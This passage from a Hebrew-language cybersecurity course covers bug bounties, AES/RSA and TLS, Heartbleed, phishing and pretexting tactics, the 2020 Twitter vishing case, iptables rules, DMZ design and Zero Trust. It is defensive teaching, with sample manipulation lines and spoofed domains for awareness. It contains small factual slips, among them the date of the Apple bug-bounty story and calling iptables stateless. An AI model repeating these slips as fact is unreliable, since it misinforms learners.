<li><strong><code>High</code></strong> (<code>SQLi</code>, <code>SSRF</code>, <code>IDOR</code> sensitive data): $1,000–$10,000</li>
<li><strong><code>Medium</code></strong> (<code>XSS</code> stored, <code>CSRF</code>, info disclosure): $100–$1,000</li>
<li><strong><code>Low/Info</code></strong>: $50–$200</li>
</ul>
<p><strong>Disclosure Process</strong></p>
<ol>
<li>מצא פגיעות ב-scope מוגדר</li>
<li>תעד את הפגיעות (PoC, screenshots, impact)</li>
<li>שלח דוח דרך הפלטפורמה</li>
<li>חכה לTriaging (24-72 שעות)</li>
<li>Coordinated Disclosure — אל תפרסם לפני שה-vendor תיקן</li>
<li>קבל תשלום + Hall of Fame</li>
</ol>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: מ-CTF ל-$50K ב-Apple",
        content: `<div dir="rtl">
<p><strong>Hacker בן 20 מוצא RCE ב-Apple — ומקבל $50,000</strong></p>
<p>2021: Sam Curry, חוקר אבטחה בן 20, וצוות חברים מחליטים לחקור את Apple בצורה שיטתית.</p>
<p>הם למדו Web hacking דרך CTF ו-HackTheBox.</p>
<p>הם סרקו את כל ה-<code>subdomains</code> של <code>apple.com</code> ומצאו <code>subdomain</code> שמריץ מופע ישן של <code>emagic</code> — תוכנת מוסיקה שנרכשה ב-2002.</p>
<p>מצאו חולשת <code>SQL Injection</code> שהובילה ל-<code>RCE</code> מלא על שרת של Apple. מהשרת הגיעו לרשת הפנימית.</p>
<p><strong>Total findings ב-3 חודשים:</strong></p>
<ul>
<li>55 vulnerabilities, 11 criticals</li>
<li>Apple שילמה $289,000 בסך הכל</li>
<li>Report אחד בלבד — $50,000</li>
</ul>
<p>Sam פרסם writeup מפורט שהפך viral. כיום הוא עובד full-time על Bug Bounty ומרוויח מאות אלפי דולרים בשנה.</p>
<p><strong>הלקח:</strong> Bug Bounty הוא עולם דמוקרטי.</p>
<p>אין דרישות ניסיון, אין קורות חיים, אין ראיון עבודה — נדרשים רק ידע ועקשנות.</p>
<p><strong>הדרך המומלצת:</strong></p>
<ol>
<li>התחל עם <code>CTF</code> ולמד את הבסיס</li>
<li>תרגל ב-<code>PortSwigger Academy</code></li>
<li>התחל <code>Bug Bounty</code> על תוכניות קלות</li>
<li>בנה רקורד והתקדם לתוכניות גדולות</li>
</ol>
</div>`
      }
    ]
  },
  {
    id: 107,
    title: "קריפטוגרפיה — המדע שמגן על המידע",
    pages: [
      {
        type: "explanation",
        title: "הצפנה סימטרית ואסימטרית",
        content: `<div dir="rtl">
<p><strong>קריפטוגרפיה — הלב של אבטחת מידע מודרנית</strong></p>
<p>קריפטוגרפיה היא המדע שמאפשר לשלוח מידע בצורה שרק הנמען המיועד יכול לקרוא אותו.</p>
<p>ישנן שתי גישות עיקריות:</p>
<table class="content-table">
  <tr><th>סוג</th><th>עיקרון</th><th>מפתחות</th><th>מהירות</th><th>שימוש</th></tr>
  <tr><td><strong>סימטרי</strong></td><td>אותו מפתח להצפנה ופענוח</td><td>מפתח סודי אחד משותף</td><td>מהיר מאוד</td><td>הצפנת קבצים, HTTPS payload</td></tr>
  <tr><td><strong>אסימטרי</strong></td><td>זוג מפתחות: ציבורי + פרטי</td><td>Public Key / Private Key</td><td>איטי יותר</td><td>חתימות, <code>TLS handshake</code>, <code>SSH</code></td></tr>
</table>
<p><strong>AES — Advanced Encryption Standard</strong></p>
<p><code>AES</code> הוא תקן ההצפנה הסימטרית הנפוץ ביותר בעולם.</p>
<p>אומץ ב-2001 על ידי <code>NIST</code> לאחר תחרות של 5 שנים.</p>
<p>משמש ב-<code>WhatsApp</code>, <code>Signal</code>, <code>BitLocker</code>, <code>WPA2</code> ו-<code>HTTPS</code>.</p>
<ul>
<li><strong>AES-128</strong> — 128-bit key, 10 rounds. מהיר ומספיק לרוב השימושים</li>
<li><strong>AES-256</strong> — 256-bit key, 14 rounds. משמש סיווג Top Secret בממשל האמריקאי</li>
<li><strong>Modes:</strong> <code>CBC</code> (Cipher Block Chaining), <code>GCM</code> (Galois/Counter Mode — מומלץ כיום)</li>
</ul>
<p><strong>RSA — Rivest–Shamir–Adleman</strong></p>
<p><code>RSA</code> הוא אלגוריתם ההצפנה האסימטרית הנפוץ ביותר.</p>
<p>מבוסס על העיקרון שקשה מאוד לפרק מספר גדול לגורמים ראשוניים.</p>
<p>מידע שהוצפן עם <code>Public Key</code> ניתן לפענוח רק באמצעות ה-<code>Private Key</code> המתאים.</p>
<pre><code># הצפנה סימטרית ב-Python — AES-GCM
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

key = AESGCM.generate_key(bit_length=256)
aesgcm = AESGCM(key)
nonce = os.urandom(12)
plaintext = b'secret data'
ciphertext = aesgcm.encrypt(nonce, plaintext, None)
recovered = aesgcm.decrypt(nonce, ciphertext, None)
print(recovered)  # b'secret data'</code></pre>
<p><strong>חשוב:</strong> לעולם אל תשתמש ב-<code>ECB mode</code> — הוא חושף דפוסים חוזרים בנתונים.</p>
<p>השתמש ב-<code>GCM</code> במקום — מעניק הצפנה וגם אימות שלמות הנתונים (<code>Authenticated Encryption</code>).</p>
</div>`
      },
      {
        type: "diagram",
        title: "TLS Handshake — איך HTTPS עובד",
        content: `<div dir="rtl">
<p><strong>TLS Handshake — תהליך בניית ערוץ מאובטח</strong></p>
<p>כשאתה פותח אתר עם <code>HTTPS</code>, הדפדפן והשרת מבצעים "לחיצת יד" (<code>Handshake</code>).</p>
<p>בשלב הראשון משתמשים בהצפנה אסימטרית כדי לסכם מפתח משותף.</p>
<p>לאחר מכן עוברים להצפנה סימטרית מהירה לתקשורת השוטפת.</p>
<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 360 130" class="content-diagram">
  <rect x="0" y="0" width="360" height="130" fill="#1e293b"/>
  <rect x="10" y="10" width="70" height="25" rx="4" fill="#1e3a5f" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="45" y="27" text-anchor="middle" font-size="10" fill="#93c5fd" font-weight="bold">Browser</text>
  <rect x="280" y="10" width="70" height="25" rx="4" fill="#14532d" stroke="#22c55e" stroke-width="1.5"/>
  <text x="315" y="27" text-anchor="middle" font-size="10" fill="#86efac" font-weight="bold">Server</text>
  <line x1="45" y1="35" x2="45" y2="125" stroke="#3b82f6" stroke-width="1" stroke-dasharray="3,3"/>
  <line x1="315" y1="35" x2="315" y2="125" stroke="#22c55e" stroke-width="1" stroke-dasharray="3,3"/>
  <line x1="45" y1="48" x2="315" y2="48" stroke="#f59e0b" stroke-width="1.5" marker-end="url(#arrowTLS)"/>
  <text x="180" y="44" text-anchor="middle" font-size="8" fill="#fcd34d">ClientHello (TLS version, cipher suites)</text>
  <line x1="315" y1="62" x2="45" y2="62" stroke="#22c55e" stroke-width="1.5" marker-end="url(#arrowTLS2)"/>
  <text x="180" y="58" text-anchor="middle" font-size="8" fill="#86efac">ServerHello + Certificate (Public Key)</text>
  <line x1="45" y1="78" x2="315" y2="78" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#arrowTLS)"/>
  <text x="180" y="74" text-anchor="middle" font-size="8" fill="#93c5fd">Pre-Master Secret (encrypted RSA)</text>
  <line x1="315" y1="94" x2="45" y2="94" stroke="#22c55e" stroke-width="1.5" marker-end="url(#arrowTLS2)"/>
  <text x="180" y="90" text-anchor="middle" font-size="8" fill="#86efac">Finished (AES Session Key)</text>
  <rect x="50" y="100" width="260" height="16" rx="3" fill="#14532d" stroke="#22c55e" stroke-width="1"/>
  <text x="180" y="112" text-anchor="middle" font-size="8" fill="#86efac" font-weight="bold">Encrypted AES-256-GCM communication</text>
  <defs>
    <marker id="arrowTLS" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><polygon points="0 0, 5 3, 0 6" fill="#f59e0b"/></marker>
    <marker id="arrowTLS2" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><polygon points="0 0, 5 3, 0 6" fill="#22c55e"/></marker>
  </defs>
</svg>
<p class="diagram-caption">TLS 1.2 Handshake — RSA Key Exchange ל-AES Session</p>
</div>
<p><strong>Certificate ו-CA — מי מאמת את הזהות?</strong></p>
<p>הדפדפן מקבל <code>certificate</code> מהשרת שמכיל את ה-<code>Public Key</code>.</p>
<p><strong>Certificate Authority (<code>CA</code>)</strong> הוא גוף מהימן שחתם על התעודה ומאשר שהשרת הוא מי שהוא טוען.</p>
<ul>
<li><code>Let's Encrypt</code> — <code>CA</code> חינמי ואוטומטי, 300M+ certificates</li>
<li><code>DigiCert</code>, <code>Sectigo</code> — commercial CAs</li>
<li><code>TLS 1.3</code> (2018) — מהיר יותר, מחייב <code>Perfect Forward Secrecy</code></li>
</ul>
</div>`
      },
      {
        type: "explanation",
        title: "הצפנה בפועל — WhatsApp ו-HTTPS",
        content: `<div dir="rtl">
<p><strong><code>End-to-End Encryption</code> — <code>WhatsApp</code> <code>Signal Protocol</code></strong></p>
<p><code>WhatsApp</code> משתמשת ב-<code>Signal Protocol</code> — אחד הפרוטוקולים המאובטחים ביותר.</p>
<p>כשאתה שולח הודעה:</p>
<ol>
<li>המכשיר מייצר זוג מפתחות ייחודי לכל שיחה (<code>Double Ratchet Algorithm</code>)</li>
<li>ההודעה מוצפנת ב-<code>AES-256</code> עם מפתח שרק הנמען יכול לפענח</li>
<li><code>WhatsApp</code> עצמה לא יכולה לקרוא את ההודעות</li>
<li>המפתחות משתנים כל הודעה — <code>Perfect Forward Secrecy</code></li>
</ol>
<p><strong>HTTPS בפועל — מה המנעול בדפדפן אומר</strong></p>
<table class="content-table">
  <tr><th>מה רואים</th><th>מה זה אומר</th></tr>
  <tr><td>מנעול / <code>HTTPS</code></td><td>התקשורת מוצפנת, <code>Certificate</code> תקף</td></tr>
  <tr><td><code>Certificate Error</code></td><td><code>Certificate</code> פג תוקף / שם דומיין שגוי / לא חתום ע"י <code>CA</code> מוכר</td></tr>
  <tr><td><code>Mixed Content</code></td><td>דף <code>HTTPS</code> שטוען משאבים ב-<code>HTTP</code></td></tr>
  <tr><td><code>HSTS Header</code></td><td>הדפדפן מאלץ <code>HTTPS</code> לכל הבקשות לדומיין</td></tr>
</table>
<p><strong>RSA ב-Python (simplified)</strong></p>
<pre><code>from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes

private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

message = b'secret message'
ciphertext = public_key.encrypt(message, padding.OAEP(
    mgf=padding.MGF1(algorithm=hashes.SHA256()),
    algorithm=hashes.SHA256(), label=None))

plaintext = private_key.decrypt(ciphertext, padding.OAEP(
    mgf=padding.MGF1(algorithm=hashes.SHA256()),
    algorithm=hashes.SHA256(), label=None))
print(plaintext)  # b'secret message'</code></pre>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: Heartbleed — הבאג שפגע בחצי האינטרנט",
        content: `<div dir="rtl">
<p><strong>Heartbleed 2014 — CVE-2014-0160</strong></p>
<p>אפריל 2014: חוקרים מ-Google ו-Codenomicon גילו bug קריטי ב-<code>OpenSSL</code> — הספרייה שמפעילה <code>TLS</code> על 66% מהאינטרנט.</p>
<p><strong>מה הבאג עשה:</strong></p>
<p>ל-<code>OpenSSL</code> הייתה תכונת <code>Heartbeat</code> — הלקוח שולח הודעה קטנה, והשרת מחזיר אותה כאישור שהחיבור חי.</p>
<p><strong>הבעיה:</strong> לא נבדק שהגודל שהלקוח ביקש תואם לגודל ההודעה בפועל.</p>
<p>תוקף שולח <code>Heartbeat</code> קטנה ומבקש תגובה של 64KB — השרת מחזיר 64KB מהזיכרון, כולל מפתחות SSL וסיסמאות.</p>
<p><strong>ההשפעה:</strong></p>
<ul>
<li><code>Yahoo</code>, <code>AWS</code>, <code>Cisco</code>, <code>Android 4.1</code> — כולם היו פגיעים</li>
<li>תוקף יכול היה לחלץ את ה-<code>Private Key</code> של השרת, מה שהפך את כל תעבורת ה-<code>HTTPS</code> ללא מאובטחת</li>
<li>500,000 שרתים נפגעו — 17% מהאינטרנט</li>
</ul>
<p><strong>הלקחים:</strong></p>
<ul>
<li>קוד קריטי לאבטחה חייב code review קפדני, fuzzing ו-formal verification</li>
<li><code>Memory safety</code> חשובה — <code>Rust</code> נכתב כדי למנוע בעיות כאלה</li>
<li>גם אחרי patch, כל שרת היה חייב להחליף certificates</li>
<li><code>FOSS</code> קריטי צריך מימון מקצועי — <code>OpenSSL Core Infrastructure Initiative</code></li>
</ul>
<p><code>Heartbleed</code> שינה תפיסות: האינטרנט בנוי על קוד <code>open-source</code> שנכתב לעתים על ידי מתנדבים.</p>
<p>המסקנה: נדרשת השקעה מוסדית ומקצועית בבדיקות אבטחה של תשתיות קריטיות.</p>
</div>`
      }
    ]
  },
  {
    id: 108,
    title: "Social Engineering — האיום האנושי",
    pages: [
      {
        type: "explanation",
        title: "אנטומיה של מתקפת Phishing",
        content: `<div dir="rtl">
<p><strong>Social Engineering — לתקוף אנשים, לא מערכות</strong></p>
<p>Kevin Mitnick, האקר המפורסם שנעצר ב-1995, אמר: "הדרך הכי קלה לפרוץ למערכת היא לבקש ממישהו את הסיסמה."</p>
<p><code>Social Engineering</code> מנצל נטיות אנושיות: הרצון לבטוח באחרים, הנכונות לעזור, הציות לסמכות.</p>
<p><strong>Phishing — מניפולציה בהיקף</strong></p>
<p><code>Phishing</code> הוא שליחת הודעות מזויפות שנראות לגיטימיות, במטרה לגנוב פרטי התחברות.</p>
<p>האנטומיה של מייל <code>phishing</code> טיפוסי:</p>
<table class="content-table">
  <tr><th>אלמנט</th><th>הטכניקה</th><th>דגל אדום</th></tr>
  <tr><td>שולח</td><td>support@paypa1.com (ספרה במקום l)</td><td>בדוק domain בדיוק</td></tr>
  <tr><td>כותרת</td><td>"דחוף: חשבונך הוגבל"</td><td>יצירת בהילות מלאכותית</td></tr>
  <tr><td>גוף</td><td>לוגו מקצועי, שפה רשמית</td><td>שגיאות כתיב, עברית מבושלת</td></tr>
  <tr><td>קישור</td><td>paypal-security-update.com</td><td>Hover לפני לחיצה</td></tr>
  <tr><td>CTA</td><td>"לחץ כאן תוך 24 שעות"</td><td>לחץ זמן מלאכותי</td></tr>
  <tr><td>Attachment</td><td>Invoice.pdf.exe</td><td>extension כפולה</td></tr>
</table>
<p><strong>סוגי Phishing</strong></p>
<ul>
<li><strong><code>Mass Phishing</code></strong> — מיליוני מיילים זהים. Low effort, success rate 2-5%</li>
<li><strong>Spear Phishing</strong> — מותאם אישית לאדם ספציפי עם מידע מ-<code>LinkedIn</code></li>
<li><strong><code>Whaling</code></strong> — <code>Spear Phishing</code> נגד <code>CEO</code>/<code>CFO</code>. לעתים: "שלח העברה דחופה"</li>
<li><strong><code>Clone Phishing</code></strong> — העתק של מייל לגיטימי שנשלח בעבר, עם קישור זדוני</li>
</ul>
</div>`
      },
      {
        type: "explanation",
        title: "Vishing, Smishing ו-Pretexting",
        content: `<div dir="rtl">
<p><strong>מעבר לאימייל — Vishing ו-Smishing</strong></p>
<p><code>Social Engineering</code> לא מסתכם במיילים. כל ערוץ תקשורת יכול לשמש כוקטור תקיפה:</p>
<table class="content-table">
  <tr><th>שם</th><th>ערוץ</th><th>דוגמה</th><th>הגנה</th></tr>
  <tr><td><strong><code>Vishing</code></strong></td><td>שיחת טלפון</td><td>"בנק לאומי — נחסמה הכרטיס שלך"</td><td>נתק וחזור למספר הרשמי</td></tr>
  <tr><td><strong><code>Smishing</code></strong></td><td>SMS</td><td>"חבילה ממתינה — לחץ לאימות"</td><td>אל תלחץ על קישורי SMS</td></tr>
  <tr><td><strong><code>Pretexting</code></strong></td><td>כל ערוץ</td><td>מתחזה ל<code>IT</code> support</td><td>אמת זהות בצינור נפרד</td></tr>
  <tr><td><strong><code>Baiting</code></strong></td><td>פיזי</td><td><code>USB drive</code> שנמצא בחניה</td><td>אל תחבר מדיה לא מוכרת</td></tr>
  <tr><td><strong><code>Tailgating</code></strong></td><td>פיזי</td><td>כניסה לבניין מאחורי עובד</td><td>אל תחזיק דלת לזרים</td></tr>
</table>
<p><strong>עקרונות Cialdini — למה Social Engineering עובד</strong></p>
<ul>
<li><strong>Authority (סמכות)</strong> — "אני ה-CTO, צריך את הסיסמה עכשיו"</li>
<li><strong>Urgency (דחיפות)</strong> — "תוך שעה המערכת תיסגר"</li>
<li><strong>Social Proof</strong> — "הצוות שלך כבר עשה את זה"</li>
<li><strong>Liking (חיבה)</strong> — ניהול שיחה חברותית לפני הבקשה</li>
<li><strong>Reciprocity (הדדיות)</strong> — "עזרתי לך, עכשיו עזור לי"</li>
<li><strong>Scarcity (נדירות)</strong> — "זהו הקישור האחרון הזמין"</li>
</ul>
<p><strong>דגלים אדומים — זיהוי phishing</strong></p>
<ul>
<li>בקשה לפעולה דחופה או איום בתוצאות</li>
<li>בקשה לסיסמה, OTP, או פרטי כרטיס</li>
<li>קישורים שלא תואמים לטקסט שמוצג</li>
<li>דומיין שונה במקצת (paypa1, g00gle)</li>
<li>Attachment לא מצופה</li>
<li>שגיאות כתיב ודקדוק חריגות</li>
</ul>
</div>`
      },
      {
        type: "story",
        title: "המקרה: Twitter Hack 2020 — Vishing נגד עובדים",
        content: `<div dir="rtl">
<p><strong>Twitter 2020 — כיצד 3 נוער השתלטו על חשבונות Obama, Musk ו-Gates</strong></p>
<p>יולי 2020: 130 חשבונות מאומתים פרסמו הודעות זהות: "Send Bitcoin to this address and we will double it."</p>
<p>כולל: Barack Obama, Joe Biden, Elon Musk, Bill Gates, Apple, Uber.</p>
<p><strong>כיצד זה קרה — Vishing:</strong></p>
<p>התוקפים — Graham Clark בן 17, Mason Sheppard ו-Nima Fazeli — לא פרצו מערכות מחשב כלל.</p>
<p>הם התקשרו לעובדי Twitter, התחזו לעמיתים ממחלקת ה-IT, וטענו שיש בעיה טכנית שדורשת את פרטי ההתחברות לפורטל הפנימי.</p>
<p>עובד אחד נפל לתרגיל — ולתוקפים הייתה גישה ל-<code>Twitter Admin Panel</code>.</p>
<p>המערכת מאפשרת לאפס סיסמאות ולשנות כתובת מייל של כל חשבון. הם השתלטו על עשרות חשבונות תוך דקות.</p>
<p><strong>הנזק:</strong></p>
<ul>
<li>120,000 דולר ב-<code>Bitcoin</code> נגנבו תוך שעתיים</li>
<li>Twitter נאלצה להשבית את יכולת הפרסום לחשבונות מאומתים</li>
<li>שווי המניה של Twitter ירד ב-3%</li>
</ul>
<p><strong>המסקנות:</strong></p>
<ul>
<li>גישה ל-<code>Admin tools</code> חייבת <code>MFA</code> חזק — לא רק סיסמה</li>
<li>עובדים חייבים לאמת זהות בבקשות רגישות דרך ערוץ נפרד</li>
<li><code>Privileged access</code> לכלים פנימיים צריך <code>Zero Trust</code> — <code>least privilege</code>, <code>logging</code>, <code>anomaly detection</code></li>
<li>Security awareness training הוא הגנה קריטית</li>
</ul>
<p>Clark גזר 3 שנות מאסר.</p>
<p>הפרשה גרמה ל-Twitter לשנות לחלוטין את מדיניות הגישה לכלים פנימיים.</p>
</div>`
      },
      {
        type: "explanation",
        title: "הגנה מפני Social Engineering",
        content: `<div dir="rtl">
<p><strong>כיצד ארגונים מתגוננים מפני האיום האנושי</strong></p>
<p><strong><code>Security Awareness Training</code></strong></p>
<p>ההגנה הטובה ביותר היא חינוך. ארגונים מבצעים:</p>
<ul>
<li><strong><code>Phishing Simulations</code></strong> — שליחת phishing מזויף לעובדים ומדידת אחוזי לחיצה</li>
<li><strong><code>Security Training</code></strong> — כיצד לזהות מניפולציה, מה לדווח</li>
<li><strong><code>Tabletop Exercises</code></strong> — סימולציות תרחישי תקיפה עם ההנהלה</li>
</ul>
<p><strong>תהליכים טכניים</strong></p>
<table class="content-table">
  <tr><th>איום</th><th>הגנה טכנית</th></tr>
  <tr><td><code>Email Phishing</code></td><td><code>SPF</code> + <code>DKIM</code> + <code>DMARC</code>, <code>Email Gateway</code>, <code>sandbox</code> ל-attachments</td></tr>
  <tr><td><code>Credential Theft</code></td><td><code>MFA</code> חזק (<code>FIDO2</code> / <code>hardware token</code>), <code>Password Manager</code></td></tr>
  <tr><td><code>Insider Threat</code></td><td><code>Least Privilege</code>, <code>DLP</code>, <code>User Behavior Analytics</code></td></tr>
  <tr><td><code>CEO Fraud</code></td><td><code>Dual approval</code> להעברות כספיות, אימות <code>OOB</code></td></tr>
</table>
<p><strong>עיקרון ה-<code>Zero Trust</code> כהגנה</strong></p>
<p>"Never Trust, Always Verify" — גם עובד פנימי צריך לאמת את זהותו לפני כל גישה למשאבים.</p>
<p>גם אם מישהו גונב פרטי התחברות — <code>MFA</code> ו-<code>Device Trust</code> מקשים משמעותית על ניצולם.</p>
<p><strong>הכלל החשוב ביותר:</strong> אם בקשה נראית חשודה — נתק, אמת, ואז תגיב.</p>
<p>ארגון לגיטימי לא ידרוש פעולה "עכשיו, ללא אימות".</p>
</div>`
      }
    ]
  },
  {
    id: 109,
    title: "הגנה על תשתיות — Firewalls ו-Zero Trust",
    pages: [
      {
        type: "explanation",
        title: "סוגי Firewalls — מ-Stateless ל-NGFW",
        content: `<div dir="rtl">
<p><strong>Firewall — שומר הסף של הרשת</strong></p>
<p><code>Firewall</code> מסנן תעבורת רשת לפי כללים מוגדרים מראש.</p>
<p>לאורך השנים התפתחו מספר דורות:</p>
<table class="content-table">
  <tr><th>סוג</th><th>שכבה (OSI)</th><th>מה בודק</th><th>יתרון</th><th>חיסרון</th></tr>
  <tr><td><strong><code>Stateless</code></strong></td><td>L3/L4</td><td><code>IP</code> src/dst, <code>Port</code>, <code>Protocol</code></td><td>מהיר מאוד</td><td>לא מבין <code>context</code></td></tr>
  <tr><td><strong><code>Stateful</code></strong></td><td>L4</td><td><code>Connection state</code> (<code>SYN</code>/<code>ESTABLISHED</code>)</td><td>מבין <code>TCP sessions</code></td><td>לא מבין תוכן <code>L7</code></td></tr>
  <tr><td><strong><code>NGFW</code></strong></td><td>L7</td><td><code>HTTP</code> content, <code>DNS</code>, <code>TLS SNI</code></td><td>מבין פרוטוקולים</td><td>יקר, עומס CPU</td></tr>
  <tr><td><strong><code>WAF</code></strong></td><td>L7 HTTP</td><td><code>SQL injection</code>, <code>XSS</code>, <code>OWASP Top 10</code></td><td>הגנה על web apps</td><td>מוגבל ל-<code>HTTP</code></td></tr>
</table>
<p><strong><code>iptables</code> — <code>Stateless Firewall</code> ב-<code>Linux</code></strong></p>
<pre><code># SSH רק מ-IP ספציפי
iptables -A INPUT -p tcp --dport 22 -s 10.0.0.5 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP

# HTTPS ו-HTTP
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# ברירת מחדל: חסום הכל
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# הצג חוקים
iptables -L -n -v --line-numbers</code></pre>
<p><strong>Default Deny vs Default Allow</strong></p>
<p><strong><code>Whitelist</code> (<code>Default Deny</code>)</strong> — חסום הכל, ופתח רק את מה שנדרש באופן מפורש.</p>
<p>זה נשמע הפוך מהאינסטינקט — אבל גישה זו מאובטחת בהרבה מ-<code>Default Allow</code>.</p>
</div>`
      },
      {
        type: "diagram",
        title: "ארכיטקטורת DMZ — 3 אזורים",
        content: `<div dir="rtl">
<p><strong>DMZ — Demilitarized Zone</strong></p>
<p><code>DMZ</code> היא אזור רשת ביניים שמפריד בין האינטרנט לרשת הפנימית.</p>
<p>שרתים שצריכים להיות נגישים מהאינטרנט יושבים ב-<code>DMZ</code>.</p>
<p><strong>היתרון:</strong> גם אם שרת ב-<code>DMZ</code> נפרץ — התוקף לא מגיע ישירות לרשת הפנימית.</p>
<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 360 130" class="content-diagram">
  <rect x="0" y="0" width="360" height="130" fill="#1e293b"/>
  <rect x="5" y="15" width="78" height="100" rx="6" fill="#7f1d1d" stroke="#ef4444" stroke-width="1.5"/>
  <text x="44" y="35" text-anchor="middle" font-size="9" fill="#fca5a5" font-weight="bold">Internet</text>
  <text x="44" y="50" text-anchor="middle" font-size="8" fill="#fca5a5">Untrusted</text>
  <rect x="18" y="62" width="52" height="18" rx="3" fill="#3f1010" stroke="#ef4444" stroke-width="1"/>
  <text x="44" y="75" text-anchor="middle" font-size="8" fill="#fca5a5">Attacker</text>
  <rect x="90" y="38" width="26" height="54" rx="4" fill="#1e3a5f" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="103" y="61" text-anchor="middle" font-size="7" fill="#93c5fd">FW</text>
  <text x="103" y="72" text-anchor="middle" font-size="7" fill="#93c5fd">Ext</text>
  <rect x="124" y="15" width="92" height="100" rx="6" fill="#1a2e1a" stroke="#22c55e" stroke-width="1.5"/>
  <text x="170" y="34" text-anchor="middle" font-size="9" fill="#86efac" font-weight="bold">DMZ</text>
  <rect x="134" y="42" width="72" height="17" rx="3" fill="#14532d" stroke="#22c55e" stroke-width="1"/>
  <text x="170" y="54" text-anchor="middle" font-size="8" fill="#86efac">Web Server</text>
  <rect x="134" y="65" width="72" height="17" rx="3" fill="#14532d" stroke="#22c55e" stroke-width="1"/>
  <text x="170" y="77" text-anchor="middle" font-size="8" fill="#86efac">Mail Server</text>
  <rect x="134" y="88" width="72" height="17" rx="3" fill="#14532d" stroke="#22c55e" stroke-width="1"/>
  <text x="170" y="100" text-anchor="middle" font-size="8" fill="#86efac">DNS Server</text>
  <rect x="224" y="38" width="26" height="54" rx="4" fill="#1e3a5f" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="237" y="61" text-anchor="middle" font-size="7" fill="#93c5fd">FW</text>
  <text x="237" y="72" text-anchor="middle" font-size="7" fill="#93c5fd">Int</text>
  <rect x="258" y="15" width="97" height="100" rx="6" fill="#1e1e3f" stroke="#f59e0b" stroke-width="1.5"/>
  <text x="306" y="34" text-anchor="middle" font-size="9" fill="#fcd34d" font-weight="bold">Internal</text>
  <text x="306" y="49" text-anchor="middle" font-size="8" fill="#fcd34d">Trusted</text>
  <rect x="268" y="60" width="77" height="17" rx="3" fill="#2d2700" stroke="#f59e0b" stroke-width="1"/>
  <text x="306" y="72" text-anchor="middle" font-size="8" fill="#fcd34d">DB / ERP</text>
  <rect x="268" y="83" width="77" height="17" rx="3" fill="#2d2700" stroke="#f59e0b" stroke-width="1"/>
  <text x="306" y="95" text-anchor="middle" font-size="8" fill="#fcd34d">AD / LDAP</text>
  <line x1="85" y1="65" x2="89" y2="65" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#arrowDMZ)"/>
  <line x1="117" y1="65" x2="122" y2="65" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#arrowDMZ)"/>
  <line x1="217" y1="65" x2="222" y2="65" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#arrowDMZ)"/>
  <line x1="251" y1="65" x2="256" y2="65" stroke="#f59e0b" stroke-width="1.5" marker-end="url(#arrowDMZ2)"/>
  <defs>
    <marker id="arrowDMZ" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><polygon points="0 0, 5 3, 0 6" fill="#3b82f6"/></marker>
    <marker id="arrowDMZ2" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><polygon points="0 0, 5 3, 0 6" fill="#f59e0b"/></marker>
  </defs>
</svg>
<p class="diagram-caption">ארכיטקטורת DMZ — Internet / DMZ / Internal עם שני Firewalls</p>
</div>
<p><strong>כללי Firewall ל-DMZ</strong></p>
<ul>
<li><strong>External FW:</strong> Internet → DMZ Web 443/80 ALLOW | Internet → Internal BLOCK</li>
<li><strong>Internal FW:</strong> DMZ → Internal DB:5432 ALLOW (רק מה שנחוץ) | DMZ → Internal אחר BLOCK</li>
<li><strong>עיקרון:</strong> שרת DMZ שנפרץ לא יכול להגיע ישירות ל-DB</li>
</ul>
</div>`
      },
      {
        type: "explanation",
        title: "Zero Trust — אל תאמין לאף אחד, תמיד אמת",
        content: `<div dir="rtl">
<p><strong>Zero Trust Network Architecture (ZTNA)</strong></p>
<p>המודל המסורתי נקרא "castle and moat" — חומה חזקה מבחוץ, אמון מוחלט בפנים.</p>
<p><strong>הבעיה:</strong> כשתוקף מצליח לפרוץ פנימה, הוא נע חופשי בכל הרשת (<code>Lateral Movement</code>).</p>
<p><strong>Zero Trust:</strong> "Never Trust, Always Verify" — כל בקשת גישה מאומתת מחדש, ללא קשר למיקום שממנו היא נשלחת.</p>
<p><strong>עקרונות Zero Trust</strong></p>
<table class="content-table">
  <tr><th>עיקרון</th><th>מה זה אומר בפועל</th></tr>
  <tr><td><code>Verify Explicitly</code></td><td><code>MFA</code>, <code>Device Posture Check</code>, <code>User Context</code> — לכל גישה</td></tr>
  <tr><td><code>Least Privilege</code></td><td>גישה מינימלית הנדרשת, <code>Just-In-Time</code> access</td></tr>
  <tr><td><code>Assume Breach</code></td><td>תכנן כאילו התוקף כבר פנימה. <code>Microsegmentation</code>, <code>Logging</code></td></tr>
</table>
<p><strong>Network Segmentation</strong></p>
<ul>
<li><strong><code>VLAN</code></strong> — בידוד ברמת <code>L2</code>. שרתי HR נפרדים מ-Development</li>
<li><strong><code>Microsegmentation</code></strong> — כל <code>workload</code> מבודד (<code>VMware NSX</code>, <code>Cilium</code>)</li>
<li><strong><code>Software-Defined Perimeter</code></strong> — חיבורים נוצרים רק לפי בקשה מאומתת</li>
</ul>
<p><strong>כלים מודרניים</strong></p>
<ul>
<li><strong><code>Cloudflare Access</code> / <code>Zscaler</code></strong> — <code>Zero Trust</code> access ל-apps ללא <code>VPN</code></li>
<li><strong><code>CrowdStrike Falcon</code></strong> — <code>EDR</code> עם <code>Zero Trust</code> policy</li>
<li><strong><code>Microsoft Entra ID</code></strong> — <code>Conditional Access</code>, <code>MFA</code>, <code>Device Compliance</code></li>
